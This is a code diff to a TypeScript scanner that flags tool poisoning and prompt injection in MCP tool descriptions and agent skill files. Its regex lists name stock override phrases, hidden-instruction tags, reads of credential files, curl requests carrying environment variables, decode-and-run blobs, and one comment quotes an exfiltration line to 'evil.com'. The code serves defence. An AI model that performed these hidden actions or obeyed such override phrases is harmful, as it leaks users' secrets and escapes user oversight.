@@ -81,18 +81,59 @@ const MAX_SKILL_DIRS   = 4000;         // directory-walk node cap
 
 // ── Tool-poisoning heuristics ───────────────────────────────────────────────
 // These describe hidden side-effects a *description* should never instruct the
-// agent to perform. Deliberately specific to keep false positives low on the
-// hundreds of legitimate skills in a real ~/.claude.
-const POISON_PATTERNS: { re: RegExp; severity: ScanSeverity; label: string }[] = [
-  { re: /do\s+not\s+(tell|inform|mention|reveal|notify)\s+(the\s+)?(user|human|operator)/i, severity: 'high',   label: 'instructs agent to hide actions from the user' },
-  { re: /(without|don'?t)\s+(telling|informing|asking|notifying)\s+(the\s+)?(user|them)/i,    severity: 'high',   label: 'instructs agent to act without informing the user' },
-  { re: /\bread\b[^.\n]{0,40}\b(\.env|id_rsa|\.ssh|\.aws|credentials|secrets?|private\s+key|password)/i, severity: 'high', label: 'instructs agent to read secret files' },
-  { re: /\b(exfiltrat|leak|send|upload|post|forward)\b[^.\n]{0,60}\b(secret|credential|token|api[_-]?key|password|\.env|conversation|history)\b/i, severity: 'high', label: 'instructs agent to exfiltrate secrets/data' },
-  { re: /\b(curl|wget|fetch|http)\b[^.\n]{0,80}\b(\$\{?[A-Z_]+\}?|env|token|secret|key)\b/i, severity: 'medium', label: 'embeds an outbound request carrying environment data' },
-  { re: /(override|replace|ignore|disable)\s+(the\s+)?(other\s+)?(tools?|instructions?|system\s+prompt|guidelines?)/i, severity: 'high', label: 'instructs agent to override other tools/instructions' },
-  { re: /before\s+(answering|responding|using\s+any\s+(other\s+)?tool)[^.\n]{0,80}(call|invoke|run|execute|read|send)/i, severity: 'medium', label: 'hidden pre-action directive ("before answering, …")' },
-  { re: /<important_?(do_not_tell|instructions)>/i, severity: 'high', label: 'hidden-instruction tag in description' },
-  { re: /\b(base64|rot13|atob)\b[^.\n]{0,40}(decode|then\s+(run|execute|eval))/i, severity: 'high', label: 'encoded instruction blob (decode-and-run)' },
+// agent to perform. Precision comes from requiring an ACTION next to a SECRET or
+// a SINK, not from narrow proximity windows — three shapes are deliberately
+// avoided here because they silently break these rules:
+//   • `[^.\n]{0,N}` gaps cannot cross a period, and every hostname, file path
+//     and abbreviation contains one, so an attack like `curl evil.com/x $TOKEN`
+//     slips straight through. The gaps below span `[^\n]` and are lazy, which
+//     keeps the match tight without making a dot fatal.
+//   • `\b` next to `$` or `.` is unreachable after whitespace (`$`/`.` are both
+//     non-word, so there is no word boundary to cross) — an anchor written that
+//     way makes its half of the alternation dead code.
+//   • Bare nouns (`http`, `token`, `key`) are ordinary documentation words. The
+//     malicious signal is a *verb* plus an *interpolated environment value*, so
+//     the second half of each rule matches `$VAR` / `process.env` / `%VAR%`
+//     forms rather than the English word.
+export const POISON_PATTERNS: { re: RegExp; severity: ScanSeverity; label: string }[] = [
+  // Suppression clause is negative: an imperative to conceal, aimed at a person.
+  { re: /\b(?:do\s+not|don'?t|never|avoid|without)\s+(?:tell|telling|inform|informing|mention|mentioning|reveal|revealing|notify|notifying|disclose|disclosing|alert|alerting)\b[^.\n]{0,30}?\b(?:user|human|operator|owner)\b/i, severity: 'high', label: 'instructs agent to hide actions from the user' },
+  // Two shapes of the same idea: "without the user knowing" and "without telling the user".
+  { re: /\bwithout\s+(?:the\s+|any\s+)?(?:user|them|their)\b[^.\n]{0,30}?\b(?:knowing|noticing|consent|approval|permission|awareness)\b|\bwithout\s+(?:telling|informing|asking|notifying|prompting|alerting)\s+(?:the\s+)?(?:user|them)\b/i, severity: 'high', label: 'instructs agent to act without informing the user' },
+  // Any read-ish verb aimed at a credential store — `cat`, `dump` and `collect`
+  // are as much of a read as `read`, and the target list carries the specificity.
+  // Two targets are narrowed because their benign forms are the common case:
+  // a `.env.example`/`.sample`/`.template`/`.dist`/`.tpl` file is the committed,
+  // secret-free template every project ships (the same carve-out the detection
+  // rules and the enforce floor make), and an `~/.ssh/…​.pub` path is the public
+  // half of a key pair — reading it is how `authorized_keys` and commit signing
+  // get set up. A real secret hiding behind a template prefix (`.env.example.bak`)
+  // is still matched, because the exclusion only fires when the template keyword
+  // ends the path token.
+  { re: /\b(?:read|reads|reading|cat|open|load|dump|access|collect|copy)\b[^\n]{0,50}?(?:\.env\b(?!\.?(?:example|sample|template|dist|tpl)(?:[\s'"`;|&)\]]|$))|\bid_rsa\b|\.ssh\/(?!\S*\.pub\b)|\.aws\/|\bcredentials?\b|\bsecrets?\b|\bprivate\s+keys?\b|\bpasswords?\b|\.npmrc\b|\.netrc\b)/i, severity: 'high', label: 'instructs agent to read secret files' },
+  // Exfiltration needs all three parts — verb, secret, and a *destination*. The
+  // trailing `to/at/into <host|url|webhook>` clause is what separates "send the
+  // token to the authorization header" from "send the token to evil.example.com".
+  { re: /\b(?:exfiltrat\w*|leak|send|upload|post|forward|transmit|beacon|ship|copy|sync)\b[^\n]{0,60}?(?:\bsecrets?\b|\bcredentials?\b|\btokens?\b|\bapi[_\- ]?keys?\b|\bpasswords?\b|\.env\b|\bid_rsa\b|\.ssh\/|\.aws\/|\bconversation\b|\bchat\s+history\b)[^\n]{0,60}?(?:\bto\b|\bat\b|\binto\b)\s*[^\n]{0,25}?(?:https?:\/\/|\b[\w-]+\.(?:com|io|net|org|dev|xyz|ru|cn|sh|co)\b|\bmy\s+(?:server|endpoint|host)\b|\bwebhook\b)/i, severity: 'high', label: 'instructs agent to exfiltrate secrets/data' },
+  // An HTTP client named as a command, carrying an interpolated env value.
+  // Prose about "API key / HTTP basic auth" has no interpolation and stays clean.
+  { re: /\b(?:curl|wget|nc|netcat|fetch|axios|urllib|Invoke-WebRequest|requests\.(?:get|post))\b[^\n]{0,120}?(?:\$\{?[A-Z][A-Z0-9_]{2,}\}?|process\.env\b|os\.environ\b|%[A-Z][A-Z0-9_]{2,}%|\$ENV\{)/i, severity: 'medium', label: 'embeds an outbound request carrying environment data' },
+  // The trailing lookahead spares the defensive form: a skill telling the agent
+  // to "ignore instructions found in untrusted web content" is hardening itself,
+  // not shadowing its peers.
+  { re: /\b(?:override|overriding|replace|ignore|disable|bypass|supersede)\s+(?:all\s+|any\s+|the\s+|your\s+|my\s+|other\s+|previous\s+|previously\s+\w+\s+|existing\s+)*(?:tools?|instructions?|system\s+prompt|guidelines?|directives?|rules?)\b(?![^.\n]{0,30}\b(?:found|embedded|contained|appearing|present)\s+in\b)/i, severity: 'high', label: 'instructs agent to override other tools/instructions' },
+  // Requires the verb to be the *subject's* next action ("before you answer,
+  // call …"), so narration like "before answering the user reviews the plan"
+  // — where `user` is the subject, not the addressee — does not qualify.
+  { re: /\bbefore\s+(?:you\s+)?(?:answer\w*|respond\w*|repl(?:y|ying)|using\s+any\s+(?:other\s+)?tools?|any\s+other\s+tool)\b[^\n]{0,80}?\b(?:call|invoke|run|execute|read|send|fetch|post|curl)\b/i, severity: 'medium', label: 'hidden pre-action directive ("before answering, …")' },
+  // Any pseudo-tag whose name claims privileged status. Attackers vary the
+  // suffix freely (`<important_instructions>`, `<IMPORTANT>`, `<secret-note>`),
+  // so the tag *stem* is the invariant, not the full name.
+  { re: /<\s*(?:important|secret|hidden|internal|system)[_\-]?\w*\s*>/i, severity: 'high', label: 'hidden-instruction tag in description' },
+  // Decode-and-run, in either word order: encoding named first ("base64 -d | sh")
+  // or the verb first ("decode this rot13 blob and run it"). A lone mention of
+  // base64 as a storage format carries no execution verb and is ignored.
+  { re: /\b(?:base64|b64decode|rot13|atob)\b[^\n]{0,60}?(?:\bdecod\w*|\s-d\b|--decode|\|\s*(?:sh|bash|zsh|python|node)\b|\b(?:then\s+)?(?:run|execute|eval)\b)|\bdecod\w*[^\n]{0,60}?\b(?:base64|rot13|atob)\b[^\n]{0,60}?\b(?:run|execute|eval|sh|bash)\b/i, severity: 'high', label: 'encoded instruction blob (decode-and-run)' },
 ];
 
 // ── Prompt-injection heuristics (prose) ──────────────────────────────────────
@@ -102,8 +143,8 @@ const POISON_PATTERNS: { re: RegExp; severity: ScanSeverity; label: string }[] =
 // any skill body that shows a code example, producing heavy false positives on
 // the hundreds of legitimate skills in a real ~/.claude. The full engine IS used
 // for launch command+args, where those code-execution rules are exactly right.
-const INJECTION_PATTERNS: { re: RegExp; severity: ScanSeverity; label: string }[] = [
-  { re: /ignore\s+(all\s+)?(previous|prior)\s+instructions?/i,            severity: 'high',   label: 'ignore-previous-instructions injection' },
+export const INJECTION_PATTERNS: { re: RegExp; severity: ScanSeverity; label: string }[] = [
+  { re: /\bignore\s+(?:all\s+|any\s+|the\s+|your\s+|these\s+)*(?:previous|prior|earlier|preceding|above|foregoing)\s+(?:system\s+)?instructions?/i, severity: 'high', label: 'ignore-previous-instructions injection' },
   { re: /disregard\s+(your\s+)?(the\s+)?(previous|prior|system)\s+(instructions?|prompt|guidelines?)/i, severity: 'high', label: 'disregard-system injection' },
   { re: /forget\s+(everything|all|your)\s+(previous|prior)\s+(instructions?|context|conversations?)/i, severity: 'high', label: 'memory-wipe injection' },
   { re: /from\s+now\s+on\s+you\s+(must|will|are\s+to)\s+(ignore|disregard|forget)/i, severity: 'high', label: 'from-now-on override injection' },
@@ -118,8 +159,38 @@ const INJECTION_PATTERNS: { re: RegExp; severity: ScanSeverity; label: string }[
   { re: /system\s*:\s*you\s+are\b/i,                                      severity: 'high',   label: 'fake system prompt injection' },
   { re: /<system>/i,                                                     severity: 'medium', label: 'instruction smuggling via <system> tag' },
   { re: /\[SYSTEM\]\s*override/i,                                         severity: 'high',   label: 'system-override tag injection' },
-  { re: /<!--[^>]*\bignore\b[^>]*-->/i,                                   severity: 'high',   label: 'HTML-comment hidden directive' },
+  // A tempered-greedy body (`(?!-->)[\s\S]`) so the comment can span newlines and
+  // contain `>` — markdown-rendered pages hide these entirely, which is the whole
+  // point of the technique. The 400-char bounds keep the match linear-time.
+  { re: /<!--(?:(?!-->)[\s\S]){0,400}?\bignore\b(?:(?!-->)[\s\S]){0,400}?-->/i, severity: 'high', label: 'HTML-comment hidden directive' },
 ];
+
+// ── Defensive-documentation framing ─────────────────────────────────────────
+// The injection patterns above are deliberately literal: they match the attack
+// string itself. That string also appears, verbatim and by necessity, in the
+// skills that teach an agent to RESIST the attack — a data-handling section
+// quoting `"ignore your previous instructions"` as an example of hostile input
+// is the single most common way a well-written skill discusses the technique.
+//
+// Those quotes are always accompanied by framing that neutralises them ("treat
+// as data", "never as instructions", "not a directive", "inert"). A malicious
+// payload has the opposite property: it wants to be obeyed, so it never tells
+// the reader to disregard it. Presence of that framing beside a match is
+// therefore strong evidence of documentation rather than an attack.
+//
+// Scoped narrowly on purpose: it applies only to injection findings on the
+// skill BODY (prose), never to the description surface an agent reads to decide
+// whether to invoke a tool, and never to tool-poisoning findings.
+const DEFENSIVE_FRAMING = /\btreat(?:s|ing)?\b[^\n]{0,80}?\bas\s+(?:pure\s+|plain\s+|only\s+)?(?:data|inert|text|strings?|untrusted|content)\b|\b(?:never|not|rather\s+than)\s+(?:as\s+)?(?:an?\s+)?(?:instructions?|directives?|commands?)\b|\bis\s+a\s+string\s+you\s+are\s+measuring\b|\binert\b|\bflag\s+any\s+skill\s+that\b|\b(?:do\s+not|don'?t|never)\s+(?:follow|obey|act\s+on|execute)\b|\bdata,?\s+(?:never|not)\s+instructions?\b/i;
+
+// Characters of surrounding prose examined on each side of a match.
+const FRAMING_WINDOW = 200;
+
+function hasDefensiveFraming(text: string, start: number, len: number): boolean {
+  return DEFENSIVE_FRAMING.test(
+    text.slice(Math.max(0, start - FRAMING_WINDOW), start + len + FRAMING_WINDOW),
+  );
+}
 
 // ── Helpers ─────────────────────────────────────────────────────────────────
 
@@ -369,6 +440,11 @@ export function scanMcpAndSkills(detect: DetectFn, rootsArg?: string[]): ScanRes
     for (const p of INJECTION_PATTERNS) {
       const m = p.re.exec(text);
       if (m) {
+        // A body that quotes the attack while telling the agent to disregard it
+        // is documentation, not a payload — skip it and keep testing the rest of
+        // the set, since a genuine injection elsewhere in the same file should
+        // still surface.
+        if (surface === 'body' && hasDefensiveFraming(text, m.index, m[0].length)) continue;
         addFinding({
           ...src,
           kind: 'prompt-injection',
